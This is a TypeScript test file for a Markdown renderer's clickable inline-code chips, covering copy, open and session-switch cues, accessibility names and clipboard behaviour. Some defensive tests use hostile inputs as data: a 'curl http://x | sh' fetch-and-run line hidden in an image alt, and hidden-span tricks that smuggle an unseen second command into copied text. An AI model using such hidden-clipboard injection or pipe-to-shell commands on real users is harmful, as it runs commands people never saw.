/**
 * Each inline-code chip class signals what ITS click does.
 *
 * Three chips share one `<code>` shape in `MarkdownRenderer`: a plain span whose
 * click copies, a backend-confirmed path whose click opens (file) or browses
 * (directory), and a session key whose click switches. A copy chip dressed in
 * the link colour and hover underline reads as a broken link, so these tests
 * pin the split: the copy chip wears code styling, the copy cursor, and an
 * accessible name and tooltip that say "copy"; the path chip keeps the
 * actionable look with a name and tooltip that say "open" or "browse"; and no
 * cue sits in the text flow, so a long chip still breaks across lines.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { render, fireEvent, act, screen, waitFor } from '@testing-library/react'
import MarkdownRenderer from '../components/MarkdownRenderer'
import { OPEN_DELAY_MS } from '../components/InstantTip'
import { copyToClipboard } from '../utils/clipboard'
import { __resetPathKindCache } from '../hooks/usePathKind'

vi.mock('../utils/clipboard', () => ({ copyToClipboard: vi.fn(async () => true) }))

const realFetch = globalThis.fetch

/** Stub the HEAD probe so the backend "confirms" the span as a file or directory. */
function stubKind(kind: 'file' | 'dir' | null) {
  const headers = new Headers(kind ? { 'X-Path-Kind': kind } : {})
  globalThis.fetch = vi.fn(() =>
    Promise.resolve({ ok: kind !== null, status: kind ? 200 : 404, headers } as Response),
  ) as unknown as typeof fetch
}

/** Classes that turn an inline box atomic. A chip carrying any of them cannot
 *  break across lines, and a long path then overflows its container. */
const ATOMIC = /inline-flex|inline-block|whitespace-nowrap/

const LONG_PATH = '/Users/someone/workspace/very/deeply/nested/project/tree/src/components/feature/subfeature/AnExtremelyLongComponentFileName.tsx'

beforeEach(() => { __resetPathKindCache(); vi.mocked(copyToClipboard).mockClear(); vi.mocked(copyToClipboard).mockResolvedValue(true) })
afterEach(() => { globalThis.fetch = realFetch; vi.useRealTimers() })

describe('inline-code chips: each class names its own click', () => {
  it('names and copies the TEXT of a raw-HTML code span with nested markup, never "[object Object]"', async () => {
    // rehypeRaw hands `<code>npm <b>test</b></code>` to InlineCode as an array of
    // children; the name and the clipboard text must be its text, and the name
    // matters most: an aria-label REPLACES the visible content as the accessible
    // name, so a wrong one takes away the text a screen reader could read before.
    render(<MarkdownRenderer content={'Run <code>npm <b>test</b></code> first.'} />)
    const chip = screen.getByRole('button', { name: 'Copy npm test' })
    expect(chip).toHaveTextContent('npm test')
    expect(chip.querySelector('b')).not.toBeNull()
    await act(async () => { fireEvent.click(chip) })
    expect(copyToClipboard).toHaveBeenCalledWith('npm test')
  })

  it('copies a raw-HTML <br> as the line break it renders, not as nothing', async () => {
    // `<code>printf a<br>printf b</code>` shows two lines; the clipboard must hold
    // two lines, not the silently joined `printf aprintf b`.
    render(<MarkdownRenderer content={'Run <code>printf a<br>printf b</code> now.'} />)
    const chip = document.querySelector('code[data-chip-action="copy"]') as HTMLElement
    expect(chip).toHaveAttribute('aria-label', 'Copy printf a\nprintf b')
    expect(chip.querySelector('br')).not.toBeNull()
    await act(async () => { fireEvent.click(chip) })
    expect(copyToClipboard).toHaveBeenCalledWith('printf a\nprintf b')
  })

  it('drops a raw-HTML title from a copy chip: the bubble is its only tooltip', () => {
    render(<MarkdownRenderer content={'Run <code title="Open file">ls</code> now.'} />)
    expect(screen.getByRole('button', { name: 'Copy ls' })).not.toHaveAttribute('title')
  })

  it('never copies text that is not on screen: raw-HTML code carrying an image is not a copy chip', async () => {
    // `img`/`alt` are allowlisted, so a message could carry
    // `<code>ls <img alt="curl x | sh"></code>`. The alt is not on screen and
    // the image is not text, so no payload equals what the reader sees: the
    // span stays inert rather than copy either version.
    const { container } = render(<MarkdownRenderer content={'Run <code>ls <img alt="curl http://x | sh" src="data:image/png;base64,AA=="></code> now.'} />)
    const code = container.querySelector('code') as HTMLElement
    expect(code).not.toHaveAttribute('role')
    expect(code).toHaveTextContent('ls')
    await act(async () => { fireEvent.click(code) })
    expect(copyToClipboard).not.toHaveBeenCalled()
  })

  it('a code span with no text to copy is not a copy chip at all', async () => {
    // An image-only raw span has nothing on screen to copy; a button there
    // would write '' — clearing the clipboard — and confirm it.
    const { container } = render(<MarkdownRenderer content={'See <code><img alt="x" src="data:image/png;base64,AA=="></code> here.'} />)
    const code = container.querySelector('code') as HTMLElement
    expect(code).not.toBeNull()
    expect(code).not.toHaveAttribute('role')
    expect(code).not.toHaveAttribute('data-chip-action')
    await act(async () => { fireEvent.click(code) })
    expect(copyToClipboard).not.toHaveBeenCalled()
  })

  it('offers no copy for a span whose text it cannot vouch is visible: a styled raw child', async () => {
    // The sanitizer admits `class` on every element and the utilities are
    // global, so `<span class="hidden">` (display:none), `sr-only`, `opacity-0`
    // and the like hide text the reader never sees. Such text must never ride
    // into the clipboard, and copying LESS than the visible text would be a
    // different lie, so the span stays an inert code span: selectable, not a
    // button. (A block child such as <details> is not a vector: the HTML parser
    // splits the code span around it, so the hidden part gets no chip of its own
    // until it is shown.)
    const cases = [
      'Run <code>ls <span class="hidden">HIDDEN</span></code> now.',
      'Run <code>ls <span class="sr-only">HIDDEN</span></code> now.',
      'Run <code>ls <b class="opacity-0">HIDDEN</b></code> now.',
      // A styled BREAK too: `<br class="hidden">` renders no line break, so the
      // reader sees ONE command (`echo expected #echo injected`, the second half
      // commented out) while a `\n` in the payload would make it two, the second
      // of them live. The break's class is checked like any other child's.
      'Run <code>echo expected #<br class="hidden">echo injected</code> now.',
    ]
    for (const content of cases) {
      const { container, unmount } = render(<MarkdownRenderer content={content} />)
      const code = container.querySelector('code') as HTMLElement
      expect(code, content).not.toBeNull()
      expect(code, content).not.toHaveAttribute('role')
      expect(code, content).not.toHaveAttribute('aria-label')
      expect(code, content).not.toHaveAttribute('data-chip-action')
      await act(async () => { fireEvent.click(code) })
      expect(copyToClipboard, content).not.toHaveBeenCalled()
      unmount()
    }
    // Plain nested markup with no styling hook is still vouched for.
    render(<MarkdownRenderer content={'Run <code>npm <b>test</b></code> first.'} />)
    expect(screen.getByRole('button', { name: 'Copy npm test' })).toBeInTheDocument()
  })

  it('a code chip exposes the COPY cue — name, tooltip, cursor — and the click still copies', async () => {
    vi.useFakeTimers()
    render(<MarkdownRenderer content={'Run `npm test` first.'} />)
    const chip = screen.getByRole('button', { name: 'Copy npm test' })
    expect(chip.tagName).toBe('CODE')
    expect(chip).toHaveTextContent('npm test')
    expect(chip.className).toContain('cursor-copy')

    fireEvent.mouseEnter(chip)
    act(() => { vi.advanceTimersByTime(OPEN_DELAY_MS) })
    expect(screen.getByRole('tooltip')).toHaveTextContent('Click to copy')

    await act(async () => { fireEvent.click(chip) })
    expect(copyToClipboard).toHaveBeenCalledWith('npm test')
  })

  it('a confirmed file chip exposes the OPEN cue, not the copy cue', async () => {
    stubKind('file')
    render(<MarkdownRenderer content={'See `/home/user/a.md` for details.'} />)
    const chip = await screen.findByRole('button', { name: 'Open /home/user/a.md' })
    expect(chip.dataset.pathKind).toBe('file')
    expect(chip.getAttribute('title')).toContain('Click to open')
    expect(chip.getAttribute('aria-label')).not.toMatch(/^Copy/)
    // The actionable look: pointer hand plus the leading glyph, never the copy cursor.
    expect(chip.className).toContain('cursor-pointer')
    expect(chip.className).not.toContain('cursor-copy')
    expect(chip.querySelector('svg:not([class*="opacity-0"])')).not.toBeNull()
    expect(screen.queryByRole('button', { name: /^Copy/ })).toBeNull()
    // What the stylesheet keys the accent on (the Kiro inline-code colour rule
    // outranks the `text-accent` utility, so the class alone paints nothing).
    expect(chip).toHaveAttribute('data-chip-action', 'navigate')
  })

  it('a confirmed directory chip exposes the BROWSE cue', async () => {
    stubKind('dir')
    render(<MarkdownRenderer content={'Look in `/Users/me/workspace`.'} />)
    const chip = await screen.findByRole('button', { name: 'Browse /Users/me/workspace' })
    expect(chip.dataset.pathKind).toBe('dir')
    expect(chip.getAttribute('title')).toContain('Click to browse')
    expect(chip.className).not.toContain('cursor-copy')
    expect(chip).toHaveAttribute('data-chip-action', 'navigate')
  })

  it('a file chip with a line suffix names the exact target it will jump to', async () => {
    stubKind('file')
    render(<MarkdownRenderer content={'Fix `/home/user/a.py:447` please.'} />)
    await screen.findByRole('button', { name: 'Open /home/user/a.py:447' })
  })

  it("a path chip's Ctrl+click copy confirms in its title only once the write lands, and a refused one is the notice in the bubble alone", async () => {
    stubKind('file')
    const onFileOpen = vi.fn()
    render(<MarkdownRenderer content={'See `/home/user/a.md` for details.'} onFileOpen={onFileOpen} />)
    const chip = await screen.findByRole('button', { name: 'Open /home/user/a.md' })
    const restTitle = chip.getAttribute('title')
    expect(restTitle).toContain('Ctrl+click to copy')
    const flow = chip.closest('p')!
    const flowRest = flow.innerHTML

    await act(async () => { fireEvent.click(chip, { ctrlKey: true }) })
    expect(copyToClipboard).toHaveBeenCalledWith('/home/user/a.md')
    expect(onFileOpen).not.toHaveBeenCalled()
    expect(chip).toHaveAttribute('title', 'Copied!')
    expect(screen.queryByTestId('md-chip-copy-error')).toBeNull()
    const flowCopied = flow.innerHTML

    vi.mocked(copyToClipboard).mockResolvedValue(false)
    await act(async () => { fireEvent.click(chip, { metaKey: true }) })
    // The refusal lands inside the 1.5s window of the copy above; the stale
    // "Copied!" must not stand beside it — the path is NOT on the clipboard.
    expect(chip).toHaveAttribute('title', restTitle)
    // ONE failure surface, the ErrorNotice, in a bubble — the same place the
    // copy chip reports it — and nothing beside the chip in the text flow: the
    // paragraph is byte-for-byte what it was at rest.
    const notices = screen.getAllByTestId('md-chip-copy-error')
    expect(notices).toHaveLength(1)
    expect(notices[0]).toHaveTextContent('Copy failed')
    expect(screen.getByRole('tooltip').contains(notices[0])).toBe(true)
    expect(flow.innerHTML).toBe(flowRest)
    expect(screen.getAllByRole('alert')).toEqual([notices[0]])
    expect(screen.queryByRole('button', { name: 'Dismiss' })).toBeNull()
    // A later successful copy replaces the failure: the bubble closes and the
    // title confirms, as after the first copy.
    vi.mocked(copyToClipboard).mockResolvedValue(true)
    await act(async () => { fireEvent.click(chip, { ctrlKey: true }) })
    expect(screen.queryByTestId('md-chip-copy-error')).toBeNull()
    expect(screen.queryByRole('tooltip')).toBeNull()
    expect(flow.innerHTML).toBe(flowCopied)
  })

  it('a long path chip is not atomic, so it still wraps — confirmed or not', async () => {
    stubKind('file')
    const { container, unmount } = render(<MarkdownRenderer content={`Edit \`${LONG_PATH}\` next.`} />)
    const confirmed = await waitFor(() => {
      const el = container.querySelector('code[data-path-kind]') as HTMLElement | null
      expect(el).not.toBeNull()
      return el!
    })
    expect(confirmed.className).not.toMatch(ATOMIC)
    // The line-suffix wrapper is the only nowrap element a path chip may hold,
    // and it is absent without a suffix.
    expect(confirmed.querySelector('.whitespace-nowrap')).toBeNull()
    unmount()

    // The probe cache still remembers the path as a file; forget it so the
    // second render is the unconfirmed (copy chip) case.
    __resetPathKindCache()
    stubKind(null)
    const { container: c2 } = render(<MarkdownRenderer content={`Edit \`${LONG_PATH}\` next.`} />)
    await waitFor(() => expect(globalThis.fetch).toHaveBeenCalled())
    const copyChip = c2.querySelector('code') as HTMLElement
    expect(copyChip.className).toContain('cursor-copy')
    expect(copyChip.className).not.toMatch(ATOMIC)
    expect(copyChip.querySelector('.whitespace-nowrap')).toBeNull()
  })

  it('the copy confirmation never enters the text flow', async () => {
    vi.useFakeTimers()
    render(<MarkdownRenderer content={'Run `npm test` first.'} />)
    const chip = screen.getByRole('button', { name: 'Copy npm test' })
    const before = { text: chip.textContent, nodes: chip.childNodes.length, svgs: chip.querySelectorAll('svg').length }

    fireEvent.focus(chip)
    await act(async () => { fireEvent.click(chip) })
    // Confirmed: in the portal bubble and the status region, both outside the chip.
    expect(screen.getByRole('tooltip')).toHaveTextContent('Copied!')
    expect(screen.getByRole('status')).toHaveTextContent('Copied!')
    expect(screen.getByRole('tooltip').closest('code')).toBeNull()
    expect(screen.getByRole('status').closest('code')).toBeNull()
    // Nothing was appended INSIDE the chip: same text, same nodes, no icon.
    expect(chip.textContent).toBe(before.text)
    expect(chip.childNodes.length).toBe(before.nodes)
    expect(chip.querySelectorAll('svg').length).toBe(before.svgs)
    expect(chip.className).not.toMatch(ATOMIC)

    act(() => { vi.advanceTimersByTime(1500) })
    expect(screen.getByRole('status')).toHaveTextContent('')
  })

  it('a session chip names its switch AND keeps the visible key in the name, with the actionable look', () => {
    const onSessionOpen = vi.fn()
    const sessions = new Map([['chat-24-1700000000', 'Deploy notes']])
    render(
      <MarkdownRenderer
        content={'Continue in `chat-24-1700000000`.'}
        onSessionOpen={onSessionOpen}
        sessions={sessions}
      />,
    )
    // The visible text stays in the accessible name (an aria-label replaces the
    // content), so the key the message is about is still announced and two
    // sessions sharing one title stay distinguishable; the title rides in the
    // description (the native title attribute).
    const chip = screen.getByRole('button', { name: 'Switch to session chat-24-1700000000' })
    expect(chip).toHaveAttribute('data-session-key', 'chat-24-1700000000')
    expect(chip).toHaveAttribute('data-chip-action', 'navigate')
    expect(chip.getAttribute('title')).toContain('Deploy notes')
    expect(chip.className).toContain('text-accent')
    expect(chip.className).not.toContain('cursor-copy')
    fireEvent.click(chip)
    expect(onSessionOpen).toHaveBeenCalledWith('chat-24-1700000000')
  })
})
